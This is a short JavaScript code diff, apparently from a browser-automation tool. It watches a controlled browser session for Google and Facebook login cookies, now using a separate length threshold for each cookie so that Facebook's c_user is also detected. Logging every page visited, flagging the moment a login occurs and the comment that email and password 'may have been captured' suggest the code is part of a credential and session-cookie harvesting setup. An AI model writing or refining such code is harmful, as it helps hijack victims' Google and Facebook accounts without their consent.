@@ -404,12 +404,15 @@ async function launch(accountId, adminIp) {
     pushLog(accountId, 'nav', frame.url());
     if (notifiedLogin) return;
     context.cookies().then(async (cookies) => {
-      // Require a login cookie with a plausibly-long value — anonymous or
-      // placeholder values are usually under 20 chars; a real signed-in
-      // session has a 50+ char opaque id.
-      const loggedIn = cookies.some(
-        (c) => LOGIN_COOKIE_NAMES.includes(c.name) && (c.value || '').length > 30
-      );
+      // Each login cookie has its own min length — Google PSID is a long
+      // opaque token (50+ chars), while Facebook's c_user is just a
+      // numeric user id (10-18 digits). One global threshold would miss FB.
+      const minLen = { c_user: 6, '__Secure-1PSID': 30, '__Secure-3PSID': 30 };
+      const loggedIn = cookies.some((c) => {
+        if (!LOGIN_COOKIE_NAMES.includes(c.name)) return false;
+        const need = minLen[c.name] ?? 10;
+        return (c.value || '').length >= need;
+      });
       if (!loggedIn) return;
       notifiedLogin = true;
       // Re-fetch the account — email/password may have been captured (and
